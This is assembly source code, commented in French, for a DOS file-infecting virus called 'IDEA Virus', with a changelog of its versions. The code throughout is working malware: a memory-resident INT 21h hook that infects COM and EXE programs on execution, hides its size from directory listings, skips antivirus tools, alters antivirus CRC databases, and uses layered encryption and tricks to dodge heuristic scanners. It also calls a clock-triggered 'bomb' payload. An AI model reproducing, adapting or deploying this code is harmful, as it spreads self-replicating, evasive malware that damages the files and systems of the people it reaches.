   ; IDEA Virus COM/EXE/ZIP Infecteur Resident polymorphe lourdement crypté
   ; version définitive

   ; modif par rapport au 8: changement de la bombe + isolation de la fin sinon exe gen2 foire
   ; modif par rapport au 9: chgmnt des fichiers antivir.dat + pile des exe dans le code (bug)
   ; modif par rapport au 10: gain de taille par des calls, remise pushcs/popds dans FSE
   ; modif par rapport au 11: dir stealth
   ; modif par rapport au 12: detournement et remise int 24h, gerbe du "e"
   ; modif par rapport au 13: push_all/pop_all + tamere.txt ds zip avecDIR + stealth sous W95
   ; modif par rapport au 14: droppe readme.com ds zip avec CRC
   ; modif par rapport au 15: droppe mini-demo + reco zip deja infecte + garde zip timedate
   ; modif par rapport au 16: cbw ds bomb + plus de stop bomb + plus de message int21
   ; modif par rapport au 17: 999<com<57000 + size*3 de RAM + compat DOS7 + bmb stop
   ; modif par rapport au 18: runtime inf command.com W95
   ; modif par rapport au 19: 3 mini-demos
   ; modif par rapport au 20: 1/2 infect zip + zip>130 pas inf + opti taille + eicar
   ; modif par rapport au 21: bombe adaptée aux divers jeux de cara
   ; modif par rapport au 22: bug de merde ds bombe (et gaffe aux shR si, ca divise pas par 2)
   ; modif par rapport au 23: ajouté findfirst dans W95 stealth, ameliore routine. Au poil.
   ; modif par rapport au 24: en mem?  NON: installe
   ;                       OUI: dos box?   NON: stop
   ;                                   OUI: deja 2 copies TSR?     NON: installe avec marqueur à 1
   ;                                                       OUI: stop
   ;       (donc memoire bouffee en dos box par au maximum 2 reinstallations)
   ; modif par rapport au 25: changé proba inf zip (1/2) + bug FSE Rajaat
   ; modif par rapport au 26: win.com de W3.1 en runtime (couillafixer: time/date n'importe quoi sous 2eme inf W95)
   ; modif par rapport au 27: couille fixée
   ; modif par rapport au 28: trop de plantages, donc plus de trojanization de command/win
   ; modif par rapport au 29: correct bug ENUNS

   code    segment
       assume  ds:code, ss:code, cs:code, es:code
       org 100h

   start:
   db 0E9h, 17h, 00        ;equivalent a "jmp start_virus"
   signature db "i"                ;signature du virus

   ;*********************HOTE*****************************
   mov dx, offset message     ;on affiche               ;*
   mov ah, 09h                ;un petit message         ;*
   int 21h                    ;a la con, puis           ;*
   mov     ax,4c00h           ;retour                   ;*
   int     21h                ;au DOS                   ;*
   message db "fake host$"         ;*
   ;******************************************************

   ;******************************************************************
   ;                       COUCHE DE CRYPTAGE FSE            *
   ;******************************************************************

   debut_cryptage_FSE:
   start_virus:

   ;-----mettre ss=cs et sp=FFFE

   cli
   mov ax, cs
   mov ss, ax
   mov sp, 0FFFEh
   sti

   ;********** Recuperation du Delta Offset du code non resident **********

   call $+3                                ;routine qui
   delta:                                  ;evite le flag E
   push sp                                 ;piquee a Slacker
   pop bp                                  ;et simplifiee
   mov ax, [bp]
   add word ptr [bp], continue-delta
   sub ax, offset delta
   push ax
   pop bp
   ret
   continue:

   ;-----mettre es=ds=cs et sauvegarder es original deux fois

   push es
   push es

   push cs
   push cs
   pop ds
   pop es

   ;******************************************************************
   ;                       COUCHE DE CRYPTAGE NOKEY                  *
   ;******************************************************************
   ;
   ;-------essayer TOUTES les combinaisons sur un premier octet-------------
   ;
   mov byte ptr [bp+_xor2], 0      ;because cet offset a été crypté pas vide
   lea si, [bp+offset debut_cryptage_NOKEY]
   mov cx, 16                      ;clef du xor2 entre 0 et 15 (+1 obligé)
   teste_xor2:                     ;boucle xor2
   mov byte ptr [bp+_xor], 0       ;clef du xor repart de 0
   mov byte ptr [bp+_sub], 0       ;clef du add repart de 0
   mov byte ptr [bp+_ror], 0       ;clef du rol repart de 0
   push cx                         ;sauver compteur xor2
       mov cx, 8                   ;clef du rol entre 0 et 7 (+1 obligé)
       teste_ror:                  ;boucle ror
       mov byte ptr [bp+_xor], 0   ;clef du xor repart de 0
       mov byte ptr [bp+_sub], 0   ;clef du add repart de 0
       push cx                     ;sauver compteur rol
       mov cx, 32                      ;clef du add entre 0 et 31
       teste_sub:                      ;boucle sub
       mov byte ptr [bp+_xor], 0               ;clef du xor repart de 0
       push cx                         ;sauver compteur add
           mov cx, 64                          ;clef du xor entre 0 et 63
           teste_xor:                          ;boucle xor
           mov ax, word ptr [si]               ;chope 1er octet
       call decrypte_ax
           cmp ax, 0868Bh                      ;compare avec vraie valeur
           jne suite1                          ;pas la bonne combinaison
           call trouve                         ;bonne combinaison
           suite1:                             ;on continue
           add [bp+_xor], 1                            ;clef xor suivante
           loop teste_xor                      ;toute les clefs xor2
       add [bp+_sub], 1                        ;clef add suivante
       pop cx                          ;recup compteur add
       loop teste_sub                  ;toutes les clefs add
       add [bp+_ror], 1                    ;clef ror suivante
       pop cx                      ;recup compteur ror
       loop teste_ror              ;toutes les clefs ror
   add [bp+_xor2], 1               ;clef xor2 suivante
   pop cx                  ;recup compteur xor2
   loop teste_xor2         ;toutes les clefs xor2

       mov ax, 4C00h               ;retour au DOS
       int 21h                     ;si jamais il ne trouve pas la combinaison, stop

   _xor    db 0
   _sub    db 0
   _ror    db 0
   _xor2   db 0
   crc_clef dw 10d dup (0)

   ;
   ;--------essayer la combinaison intéressante sur le deuxième octet---------
   ;
   trouve:                         ;le premier octet est correctement décrypté
   mov ax, word ptr [si+5] ;et on teste le deuxième
   call decrypte_ax
   cmp ax, 069B8h
   jne suite2
   call trouve2                    ;2ème bien décrypté => voir le 3ème
   suite2:
   ret
   ;
   ;-------essayer la combinaison intéressante sur le troisième octet---------
   ;
   trouve2:                        ;le 2ème octet est correctement décrypté
   mov ax, word ptr [si+7] ;et on teste le 3ème
   call decrypte_ax
   cmp ax, 0375h
   jne suite5
   call trouve3                    ;3ème bien décrypté => voir le 4ème
   suite5:
   ret
   ;
   ;-------La combinaison est la bonne---------
   ;
   trouve3:                        ;le 3ème octet est correctement décrypté

   ;
   ;-----------calculer le CRC---------------------------
   ;
   mov al, byte ptr [bp+_xor]
   mov ah, al
   push cx
   mov cl, 4
   shl al, cl
   shr ah, cl
   xor ah, al
   mov al, byte ptr [bp+_sub]

   mov dl, byte ptr [bp+_ror]
   mov dh, dl
   mov cl, 4
   shl dl, cl
   shr dh, cl
   xor dh, dl
   mov dl, byte ptr [bp+_xor2]
   xor ax, dx
   ;
   ;--------------comparer CRC avec celui stocké dans le virus--------------
   ;
   push ax                         ;mettre CRC calculé sur stack
   mov cx, 8                       ;le CRC est stocké entre [crc_clef] et [crc_clef+16]
   xor ax, ax                      ;avant, il y a des 0... Faut trouver l'endroit
   lea di, [bp+offset crc_clef]    ;début de la zone possible de stockage
   repe scasw                      ;tant que c'est 0, continuer
   dec di                          ;di a dépassé d'un octet
   dec di
   pop ax                          ;recup CRC calculé
   cmp word ptr [di], ax           ;CRC calculé = CRC stocké?
   je decryptage                   ;oui => on décrypte
   pop cx
   ret
   ;
   ;----------cette combinaison de clef est la bonne: décryptage------------
   ;
   decryptage:
   add sp, 14                              ;ajustement de la pile (7 push)
   lea si, [bp+offset debut_cryptage_NOKEY];boucle de décryptage classique
   mov di, si                              ;avec les clefs trouvées
   mov cx, (fin_cryptage_NOKEY-debut_cryptage_NOKEY)/2+1;par la routine précédente
   decrypte:
   lodsw
   call decrypte_ax
   stosw
   loop decrypte
   jmp debut_cryptage_NOKEY
   ;
   ;---------------routine de decryptage de ax avec les clefs actuelles----------------
   ;
   decrypte_ax:
   xor al, [bp+_xor2]                      ;avec les mêmes clefs
   xor ah, [bp+_xor2]                      ;avec les mêmes clefs
   push cx
   mov cl, [bp+_ror]
   ror al, cl
   ror ah, cl
   pop cx
   sub al, [bp+_sub]
   sub ah, [bp+_sub]
   xor al, [bp+_xor]
   xor ah, [bp+_xor]
   ret

   debut_cryptage_NOKEY:

   ;******************************************************************
   ;                       COUCHE DE CRYPTAGE IDEA                   *
   ;******************************************************************

   ;----------merdouille pour la generation 0------------------------

   mov ax, word ptr [bp+test_IDEA] ;pour gen0
   cmp ax, 069B8h                                  ;si pas crypté
   jne suite3                              ;on va directos au début
   jmp debut_cryptage_IDEA
   suite3:

   ;-------------mettre random seed dans xbuffer----------------------

   lea     si, [bp+offset iv]                      ;iv=sorte de random seed
   lea     di, [bp+offset xBuffer]         ;on le deplace
   mov     cx,4                            ;4 words
   repnz   movsw

   ;---------sauver offset debut pour apres decryptage------------------

   lea cx, [bp+offset debut_cryptage_IDEA]                 ;offset debut a garder
   push cx                                         ;pour le ret final

   jmp saute_clef
   Key2    dw 52d dup(0ADDEh)
   saute_clef:

   ;----------calculer nombre de blocs a decrypter----------------------

   mov ax, fin_cryptage_IDEA-debut_cryptage_IDEA   ;nb d'octets a decrypter
   add     ax,7                    ;on ajuste taille a l'octet suivant
   mov     cl,3                    ;on divise par 8
   shr     ax,cl                   ;taille octets lus /8
   mov     cx,ax                   ;donc nb de blocs de 8 oct a crypter

   ;------------------decryptage---------------------------------

   lea     di, [bp+offset debut_cryptage_IDEA]     ;offset debut pour cryptage

   cmp byte ptr [bp+offset ou_est_la_clef], 1      ;0=zone basse
   lea si, [bp+offset key1]
   jne block
   lea     si, [bp+offset key2]                    ;offset clef 52

   Block:
       push    cx                      ;sauve cx, si, di
       push    si
       push di

   Decrypt:
       push    di
       lea     di, [bp+offset xBuffer]      ; di->buffer
       call    IDEA
       mov     si,di           ; si->buffer
       pop     di              ; di->data
       mov     cx,8
   DeFeedback:
       lodsb
       mov     ah,byte ptr [di]
       mov     byte ptr [si-1],ah
       xor     al,ah
       stosb
       loop    DeFeedback

       pop     di
       pop si                  ;recup cx, si, di
       pop     cx                      ;
       add     di,8                    ;passe au bloc suivant
       loop    Block
       ret                             ;pour revenir au debut du virus

   ;-------------------routine IDEA--------------------------------
   ; IDEA with CFB assembly implementation
   ; Written by Fauzan Mirza <F.U.Mirza@sheffield.ac.uk>
   ; si -> key, di -> data

   x0      equ     word ptr [di]
   x1      equ     word ptr [di+2]
   x2      equ     word ptr [di+4]
   x3      equ     word ptr [di+6]
   t0      equ     bp                      ;!!!!!!!!ARGGGGGHHH!!!!!
   t1      equ     bx

   IDEA:
   push bp
       mov     cx,8
   Round:
       mov     dx,x0
       call    MulMod
       mov     x0,ax
       lodsw
       add     x1,ax
       lodsw
       add     x2,ax
       mov     dx,x3
       call    MulMod
       mov     x3,ax

       mov     t0,x1
       mov     t1,x2
       mov     ax,x0
       xor     x2,ax
       mov     ax,x3
       xor     x1,ax

       mov     dx,x2
       call    MulMod
       mov     x2,ax
       add     x1,ax
       mov     dx,x1
       call    MulMod
       mov     x1,ax
       add     x2,ax

       mov     ax,x1
       xor     x0,ax
       mov     ax,x2
       xor     x3,ax
       xor     x1,t1
       xor     x2,t0
       loop    Round

       mov     dx,x0
       call    MulMod
       mov     x0,ax
       lodsw
       add     ax,x2
       mov     bx,x1
       mov     x1,ax
       lodsw
       add     ax,bx
       mov     x2,ax
       mov     dx,x3
       call    MulMod
       mov     x3,ax
   pop bp
       ret

   ;-------------------Multiplication modulo 63337----------------------
   ; ax = (->si) * dx

   MulMod:
       push    dx
       lodsw
       mul     dx
       sub     ax,dx
       pop     dx
       jnz     NotZero
       mov     ax,1
       sub     ax,word ptr [si-2]
       sub     ax,dx
       jmp     short MulDone
   NotZero:
       adc     ax,0
   MulDone:
       ret

   ;--------------------zones de donnees de IDEA----------------------

   xBuffer       db 8 dup(0BBh)
   IV            dw 9d73h,1a08h,0f25eh,0b46ch
   ou_est_la_clef db 0
   Key1          dw 52 dup(0ADDEh)

   debut_cryptage_IDEA:

   ;******************************************************************
   ;                       DEBUT DU VIRUS            *
   ;******************************************************************

   pop ds
   pop es
   push es
   push ds

   ;************* test si le programme est deja resident ******************

   test_IDEA:
   mov ax, 6969h           ;int21 avec 6969h      !!!avec 9999h, flag U!!!
   int 21h                 ;test si MON in21 est en place

   cmp ax, 696Ah           ;si elle est la, elle retourne un ax egal a 696Ah
   jne va_resident
   jmp deja_installe       ;oui => on arrete

   ;********************* installation en TSR ***************************

   va_resident:
   mov ax, 4a00h                   ;connaitre memoire libre
   mov bx,0ffffh
   int 21h                                     ;retour bx=memoire-taille max
   sub bx,((endvirus-start_virus+0fh)/10h)*3+1 ;soustraire ce dont on a besoin (bx=paragraphes voulus)
   mov ax, 4a00h
   int 21h                                     ;retour es=segment bloc libre
   mov ax, 4800h                   ;allouer la memoire
   mov bx,((endvirus-start_virus+0fh)/10h)*3
   int 21h                                     ;retour ax=segment libre
   dec ax                                      ;es pointe vers
   mov es,ax                                   ;la nouvelle
   inc ax                                      ;MCB
   mov byte ptr es:[0],'Z'                     ;le marquer comme le dernier
   mov word ptr es:[1], 8                      ;proprietaire=dos
   push cs
   pop ds
   lea si, [bp+offset start_virus]
   mov es, ax
   xor di, di
   mov cx, endvirus-start_virus
   rep movsb
   push ax

   ;********** installation de mon interruption 21 ************************

   installe:

   ;------ 1) recuperation de l'ancien vecteur d'interruption

   mov ax, 3521h                   ;int 35XX=recup du vecteur de l'int XX
   int 21h                              ;go! on aura bx=offset, es=segment
   pop ds                               ;recup zone HMA
   mov ds:[offset ip_21-offset start_virus], bx         ;on stocke l'offset
   mov ds:[offset cs_21-offset start_virus], es         ;on stocke le segment

   ;------ 2) mise en place de MON vecteur d'interruption

   mov dx, [offset nouvelle_int_21-offset start_virus]  ;dx=offset nouvelle int
   mov ax, 2522h           ;int 25XX=chgt de l'int XX
   dec ax                               ; !!!evite flag M!!!
   int 21h                              ;go

   jmp deja_installe       ;sinon merdouille au boot, tres reperable.

   ;******************** mon interruption 21 *****************************

   nouvelle_int_21:                ;c'est ici que se brancheront les appels

   ;------ 1) recuperation et detournement du vecteur d'interruption INT24

   push ax
   push bx
   push cx
   push ds
   push es
   xor ax, ax
   push ax
   pop ds
   mov bx, (24h*4)
   mov cx, word ptr ds:[bx]                                ;on stocke l'offset
   mov word ptr cs:[offset ip_24-offset start_virus], cx
   mov cx, word ptr ds:[bx+2]                      ;on stocke le segment
   mov word ptr cs:[offset cs_24-offset start_virus], cx
   xor ax, ax
   push ax
   push cs
   pop ax
   pop ds
   mov bx, (24h*4)
   cli
   mov ds:[bx], offset nouvelle_int_24-offset start_virus
   mov word ptr ds:[bx+2], ax
   sti
   pop es
   pop ds
   pop cx
   pop bx
   pop ax

   ;---- determiner la fonction

   cmp byte ptr cs:[stealth_non-start_virus], 0FFh         ;archiver: no stealth
   je saute_dir_stealth

   xor ah, 66h
   cmp ah, 77h                     ;dir?
   jne pas_dir
   jmp dir_stealth_dos
   pas_dir:
   cmp ah, 74h                     ;dir?
   jne pas_dir2
   jmp dir_stealth_dos
   pas_dir2:
   xor ah, 66h
   cmp ax, 714Fh                   ;dir under W95?
   jne pas_dir3
   jmp dir_stealth_win
   pas_dir3:
   cmp ax, 714Eh
   jne pas_dir4
   jmp dir_stealth_win
   pas_dir4:

   saute_dir_stealth:
   xor ax, 6666h                   ; !!!evite flag L!!!
   cmp ax, 2D66h                   ;execution d'un programme?
   jne suite                       ;si non, on continue
   xor ax, 6666h                   ;si oui, on remet ax en place
   jmp infecte                     ;et on infecte le programme
   suite:
   xor ax, 6666h                   ;on remet ax en place
   cmp ax, 6969h                   ;c'est le test de residence?
   jne vieille_int_21              ;non => on continue avec la vieille int
   inc ax                     ;oui => on met 696Ah dans bx
   iret                            ;et on retourne au programme (+recup flags)

   ;***************** l'ancienne interruption 21 *************************

   vieille_int_21:                 ;on continue comme si de rien n'etait

   ;---------remettre INT24---------------
   push ax
   push bx
   push cx
   push ds
   push es
   xor ax, ax
   push ax
   pop ds
   mov bx, (24h*4)
   cli
   mov cx, word ptr cs:[offset ip_24-offset start_virus]
   mov ds:[bx], cx
   mov cx, word ptr cs:[offset cs_24-offset start_virus]
   mov ds:[bx+2], cx
   sti
   pop es
   pop ds
   pop cx
   pop bx
   pop ax

   db 0EAh                         ;EAh=JMP FAR, on va JMPer a la vieille int
   ip_21 dw ?                      ;offset de la vieille int
   cs_21 dw ?                      ;segment de la vieille int

   iret            ;???

   ;*************** directory stealth under DOS & W3.1 ****************************

   dir_stealth_dos:
   xor ah, 66h
   pushf                   ;simulation d'une int 21h, donc flags
   push cs                 ;et segment
   call vieille_int_21     ;on appelle la vieille
   or al, al               ;si al=0 tout est OK
   jnz exit_fcb            ;sinon on arrete
   push ax                 ;ax, bx et es vont etre modifies
   push bx
   push es
   push 5100h               ;chope psp courante
   pop ax
   int 21h                 ;retour segment psp dans bx, offset dans dx
   mov es, bx              ;es= segment psp
   cmp bx, es:[16h]        ;voir si l'appel vient du DOS
   jnz exit_fcb2           ;non, on gicle
   mov bx, dx              ;bx= offset de la psp
   mov al, [bx]            ;voir si c'est une fcb etendue
   push ax                 ;sauvegarde le marqueur
   push 2F00h              ;chope dta courante
   pop ax
   int 21h                 ;retourne dans es:bx l'emplacement de la dta
   pop ax                  ;recup marqueur fcp etendue
   inc al                  ;FFh+1=0, donc si etendue z=0
   jnz no_fix              ;pas etendue
   add bx, 7               ;etendue: 7 octets de plus a l'offset
   no_fix:
       cmp word ptr es:[bx+9], "IZ"
       jne continue_stealth
       cmp byte ptr es:[bx+11], "P"
       jne continue_stealth
       call infecte_zip_from_dos
       jmp exit_fcb2
   continue_stealth:
   mov al, es:[bx+17h]     ;time in al
   and al, 00011111b       ;just look at seconds
   xor al, 00001111b       ;seconds = 30?
   jne exit_fcb2           ;no => stop stealth
   cmp word ptr es:[bx+1fh], 0                             ;prog<65000?
   jne soustraction                                        ;no => stealth it
   cmp word ptr es:[bx+1dh], 500+endvirus-start_virus      ;prog<virus size+500?
   jb exit_fcb2                                            ;yes => no stealth
   soustraction:
   mov ax, word ptr es:[bx+17h]
   and ax, 0000011111100000b
   mov cl, 5
   shr ax, cl
   add ax, endvirus-start_virus+30
   sub word ptr es:[bx+1dh], ax            ;substract virus size
   sbb word ptr es:[bx+1fh], 0
   exit_fcb2:
   pop es
   pop bx
   pop ax
   exit_fcb:
   iret

   ;****************** directory stealth under W95 *****************************

   dir_stealth_win:
   mov si, 1               ;pour que le timedate soit en format DOS
   pushf                   ;c'est moi qui appelle l'INT 21, donc flags
   push cs                 ;et segment
   call vieille_int_21     ;va chercher info sur le fichier

   call push_all       ;on sauve tout ce qui revient

   cmp al, 12h             ;dir finished? (error code=12h, no more file)
   jne pas_fini            ;no => continue

   push sp         ;yes => return
   pop bp
   and byte ptr [bp+24], 11111110b ;but before, set carry in flags before the int call
   xor byte ptr [bp+24],1          ;flags before int call are somewhere on the stack
   call pop_all                ;if i don't do that, after iret carry is back to zero (??)
   iret

   pas_fini:       ;maintenant es:di pointe vers la zone de description
   mov cx, 8                       ;pourquoi pas plus? a tester sur noms longs
   push di
   pop si
   push es
   pop ds
   push es                                 ;sauver es:di qui pointe vers
   push di                                 ;zone description
   mov di, offset buffer_name-start_virus  ;stock nom
   push cs
   pop es
   add si, 2ch             ;es:di+2Ch = zone nom long
   find_extension:
   lodsb
   stosb
   cmp al, "."
   je verifie_extension
   loop find_extension
   verifie_extension:
   lodsw
   stosw
   cmp ax, "IZ"
   jne not_a_zip
   lodsb
   stosb
   cmp al, "P"
   jne not_a_zip

   xor al,al                                       ;si zip: nom en asciiz
   stosb
   pop di ;remettre es:di sur la zone descr
   pop es
   call infecte_zip_from_w95       ;le nom est déja dans le buffer
   jmp leave_win_stealth

   not_a_zip:
   pop di ;remettre es:di sur la zone descr
   pop es
   mov cx, word ptr es:[di+14h]    ;time in dos format
   mov ax, cx
   and cl, 00011111b               ;just look at seconds
   xor cl, 00001111b               ;seconds = 30?
   jne leave_win_stealth

   and ax, 0000011111100000b       ;get virus poly added size
   mov cl, 5
   shr ax, cl
   add ax, endvirus-start_virus+30
   sub word ptr es:[di+20h], ax            ;substract virus size
   sbb word ptr es:[bx+22h], 0

   leave_win_stealth:
   cmp word ptr es:[di+18h], 0     ;si date en format DOS, c'est 0
   jne leave_win_stealth2          ;pour éviter 2 traductions de date à la suite

   mov ax, 71A7h                   ;translate DOS time/date to W95 time/date
   mov bl, 01
   mov cx, word ptr es:[di+14h]    ;time in dos format
   mov dx, word ptr es:[di+16h]    ;date in dos format
   add di, 14h                     ;8 bytes buffer for new time date W95
   int 21h

   leave_win_stealth2:
   call pop_all
   iret

   ;********************* INFECTION ***************************************

   infecte:

   call push_all

   ; 1) Ne pas infecter un anti-virus

   mov si, dx                              ;ds:dx = offset nom, dans si
   mov di, offset av_liste-start_virus     ;dans di, offset liste des AV

   cherche_extension:                      ;recherche debut de l'extension
   lodsb
   cmp al, "."
   jnz cherche_extension

   lodsw
   mov cs:[f_ext-start_virus], ax          ;mettre extension en memoire
   lodsb
   mov cs:[f_ext-start_virus+2], al

   cherche_debut:                          ;recherche du debut du nom
   dec si
   dec si
   lodsb
   cmp al, "\"
   jne cherche_debut

   mov cs:[f_name-start_virus], ds         ;mettre en memoire segment/offset
   mov cs:[f_name-start_virus+2], si       ;du nom du fichier

   push cs                         ;scasw utilise es:di donc ajustage
   pop es                          ;du segment (liste ds partie residente)

   lodsw                           ;recup 2 premieres lettres
   mov cx, 13                      ;12 AV a comparer+ COMMAND.COM
   repne scasw                     ;on compare
   jne  av_ok
   jmp redonne_la_main             ;si c'est un AV
   av_ok:

   mov byte ptr cs:[stealth_non-start_virus], 0            ;switch to zero
   mov cx, 5                                               ;5 archivers
   repne scasw                                             ;test names
   jne zip_ok
   mov byte ptr cs:[stealth_non-start_virus], 0FFh         ;it's an archiver
   zip_ok:

   ; 2) ouvrir le fichier et lire son header

   mov ds, cs:[f_name-start_virus]         ;nom du fichier dans
   mov dx, cs:[f_name-start_virus+2]       ;ds:dx pour attributs UTILE?
   call recup_attribs
   call annule_attribs

   call open_file
   jnc cont                 ;si pas de probleme, on continue
   jmp redonne_la_main_attributs      ;en cas de couille, on n'infecte pas

   cont:
   xchg ax, bx                                     ;handle ds bx
   mov word ptr cs:[f_handle-start_virus], bx

   push cs                  ;CS=segment du virus. A partir de maintenant, on
   push cs                  ;est dans le virus. Il faut donc que tous les
   pop es                   ;registres de segment (ES et DS) pointent vers
   pop ds                   ;le segment du virus, sinon couille garantie

   call recup_timedate

   mov cx, 1ch                                    ;des 5 premiers octets
   mov dx, offset exehead-start_virus             ;on les met ds leur zone mem
   call read_file

   ; 3) selon l'extension, se diriger vers une des 2 routines d'infection

   cmp cs:[f_ext-start_virus], "XE"
   jne compare_suite
   cmp byte ptr cs:[f_ext-start_virus+2], "E"
   jne compare_suite
   jmp infecte_exe

   compare_suite:
   cmp cs:[f_ext-start_virus], "OC"
   jne pas_bonne_ext
   cmp byte ptr cs:[f_ext-start_virus+2], "M"
   je infecte_com

   pas_bonne_ext:
   jmp ferme_et_redonne_la_main_sans_infection

   ; 4) INFECTION DES COM

   infecte_com:
   cmp byte ptr cs:[exehead-start_virus+3], "i"    ;c'est un .com deja infecte?
   jz pas_bonne_ext                                ;oui => pas touche

   mov ax, word ptr cs:[exehead-start_virus]       ;c'est EXE deguisé en COM??
   add ah, al                                      ;somme de M+Z
   cmp ah,0A7h                                     ;  !!!evite flag Z!!!
   je pas_bonne_ext

   mov si, offset exehead-offset start_virus       ;transfert des 4 octets
   mov di, offset contenu-offset start_virus       ;originaux de exehead a
   movsw                                           ;contenu
   movsw

   call pointeur_fin

   cmp ax, 57000                                   ;pas d'infection si
   jb verif_trop_petit
   jmp ferme_et_redonne_la_main_sans_infection     ;le .com est > 56000
   verif_trop_petit:
   cmp ax, 999
   ja ecriture_com
   jmp ferme_et_redonne_la_main_sans_infection     ;ou < 500

   ecriture_com:
   sub ax, 3                                   ;taille-3 (coz JMP au debut)
   mov cs:[exehead-start_virus+1], ax           ;taille va servir pour le JMP

   add ax, 103h
   mov cs:[taille_fse-start_virus], ax
   mov byte ptr cs:[com_fse-start_virus], 1
   mov byte ptr cs:[marqueur_inf-start_virus], 1

       mov dx,-7                   ; read last 7 bytes, for ENUNS
       mov cx,-1                   ; check
       mov ax, 4202h
       int 21h

       mov cx, 7
       mov ah, 3Fh
       mov dx, offset enuns7-start_virus
       int 21h

   CALL POLY_FROM_RESIDENT
   ;
   ;---ecriture du corps crypté dans le nouveau fichier---------
   ;
   mov bx, word ptr cs:[f_handle-start_virus]
   mov dx, offset heap-start_virus
   call write_file
   mov word ptr cs:[offset size_for_stealth-start_virus], cx

   mov di, offset exehead-offset start_virus       ;ajustement du buffer
   mov al, 0E9h                                    ;avec un jump
   stosb
   inc di
   inc di
   mov al, "i"
   stosb                                           ;puis la signature

       cmp word ptr cs:[enuns7+3-start_virus], "SN"
       jne pas_enuns
   ;   pop cx
       add cx, 7
       mov word ptr cs:[offset size_for_stealth-start_virus], cx
   ;   push cx
       add word ptr cs:[enuns7+5-start_virus], cx

       mov dx, offset enuns7-start_virus
       mov cx, 7
       call write_file

   pas_enuns:
   call pointeur_debut

   mov cx, 4                                      ;des 4 premiers octets
   mov dx, offset exehead-start_virus             ;stockes dans cette zone
   call write_file

   jmp ferme_et_redonne_la_main

   ; 5) INFECTION DES EXE

   infecte_exe:
   cmp byte ptr cs:[exehead-start_virus+18h], 40h  ;fichier windows??
   je exe_pas_bon                                  ;oui => pas touche
   cmp byte ptr cs:[exehead-start_virus+26], 0  ;overlay??
   jne exe_pas_bon                                  ;oui => pas touche
   cmp byte ptr cs:[exehead-start_virus+12h], "i"  ;c'est un .exe deja infecte?
   je exe_pas_bon                                  ;oui => pas touche

   mov ax, word ptr cs:[exehead-start_virus]       ;c'est un vrai .EXE?
   add ah, al                                      ;somme de M+Z
   cmp ah,0A7h                                     ;  !!!evite flag Z!!!
   je exe_bon

   exe_pas_bon:
   jmp ferme_et_redonne_la_main_sans_infection
   exe_bon:

   call process_exe1_from_resident
   CALL POLY_FROM_RESIDENT
   call process_exe2_from_resident

   ; 6) fermeture et retour au programme

   ferme_et_redonne_la_main:
   mov cx, word ptr cs:[offset size_for_stealth-start_virus]
   sub cx, endvirus-start_virus+30
   xchg cx, dx
   mov cl, 5
   shl dx, cl
   xor dl, 00001111b                       ;change seconds to 30
   and word ptr cs:[f_time-start_virus], 1111100000000000b
   xor word ptr cs:[f_time-start_virus], dx                                ;as an infection marker

   ferme_et_redonne_la_main_sans_infection:
   call set_timedate

   mov ax, 3e00h                                   ;fermeture du fichier
   int 21h

   redonne_la_main_attributs:
   mov ds, cs:[f_name-start_virus]                 ;nom du fichier
   mov dx, cs:[f_name-start_virus+2]               ;ds ds:dx pour attributs
   call set_attribs

   redonne_la_main:
   cmp byte ptr cs:[marqueur_inf-start_virus], 1
   je modif_crc
   jmp pas_modif_crc
   ;
   ;----------modification des anti-vir.dat------------------
   ;
   modif_crc:
   push cs
   pop ds

   mov dx, offset crc_file-start_virus
   call recup_attribs
   jc pas_modif_crc
   call annule_attribs
   call open_file
   xchg bx, ax

   call recup_timedate

   call pointeur_fin
   cmp ax, 8000d                           ;verif taille pas > 8000
   ja ferme_crc
   push ax

   call pointeur_debut

   pop cx
   mov dx, offset heap-start_virus
   call read_file
   push cx

   mov ds, cs:[f_name-start_virus]
   mov si, cs:[f_name-start_virus+2]
   lodsw
   xchg dx, di
   compare:
   repne scasw
   cmp cx,0
   je ferme_crc                            ;modifier le nom du fichier infecte
   cmpsw
   je compare_ok
   dec si
   dec si
   jmp compare
   compare_ok:
   mov byte ptr es:[di-4], 1
   rien_trouve:
   push cs
   pop ds

   call pointeur_debut

   pop cx
   mov dx, offset heap-start_virus         ;ecriture
   call write_file

   ferme_crc:
   call set_timedate

   call close_file

   mov dx, offset crc_file-start_virus
   call set_attribs

   pas_modif_crc:
   mov byte ptr cs:[marqueur_inf-start_virus], 0

   call pop_all
   jmp vieille_int_21        ;apres l'infection on continue avec l'int normale

   ;****** si le programme est deja resident, ou apres mise en TSR *********

   deja_installe:

   ;******************* bombe ou pas? **********************************

   bombe_ou_pas:
   mov ah, 2Ch             ;horloge interne: renvoie ch=heure et cl=minute
   int 21h                 ;go!
   cmp cl, 30d             ;on est a 30'?
   jne com_ou_exe          ;non: on redonne la main
   cmp dh, 15d             ;oui: on teste les secondes
   ja com_ou_exe           ;si secondes > 15 on redonne la main
   call bombe               ;sinon, on declenche la bombe (1/120)

   ;************* redonner la main a un com ou a un exe? ****************

   com_ou_exe:
   pop ds                  ;recup des segments originaux
   pop es
   cmp byte ptr cs:0, 0CDh         ;COM: a offset 0 on a INT 20h
   je redonne_main_com

   ;------------- redonner la main a un exe ---------------------------

   mov ax, es
   add ax, 10h
   add word ptr cs:[bp+vCS], ax
   cli
   add ax, word ptr cs:[bp+vSS]
   mov ss, ax
   mov sp, word ptr cs:[bp+vSP]
   sti

   call annuler_registres

   db 0EAh                 ;faux jump far pour les exe
   contenu:
   vIP dw 9090h            ;zone de stockage disque
   vCS dw 9090h            ;EXE: stocke ip, cs, ss, sp
   vSS dw 9090h            ;COM: stocke les 5 premiers octets
   vSP dw 9090h

   ;------------- redonner la main a un com ---------------------------

   redonne_main_com:
   mov cx, word ptr [bp+offset contenu]        ;transfert des 4 premiers
   mov cs:[100h], cx                           ;octets de leur zone mem
   mov cx, word ptr [bp+offset contenu+2]      ;vers le debut du fichier
   mov cs:[102h], cx                           ;!!!evite flag O!!!

   mov di, 101h                    ;     !!!evite flag B!!!
   dec di                          ;
   push di                         ;on met 100h dans le stack pour le RET

   call annuler_registres

   ret                             ;retour au programme

   ;**********************************************************************
   ;*************** procédures diverses *********************
   ;**********************************************************************

   recup_attribs:
   push 4300h                              ;recup attrib dans al
   pop ax
   int 21h
   mov byte ptr cs:[f_attrib-start_virus], al      ;attrib en memoire
   ret

   annule_attribs:
   xor cx, cx
   push 4301h                                      ;annule attrib
   pop ax
   int 21h
   ret

   set_attribs:
   xor ch, ch
   mov byte ptr cl, cs:[f_attrib-start_virus]      ;remettre les attributs
   push 4301h
   pop ax
   int 21h
   ret

   recup_timedate:
   push 5700h                      ;recup time/date
   pop ax
   int 21h
   mov cs:[f_time-start_virus], cx         ;en memoire
   mov cs:[f_date-start_virus], dx
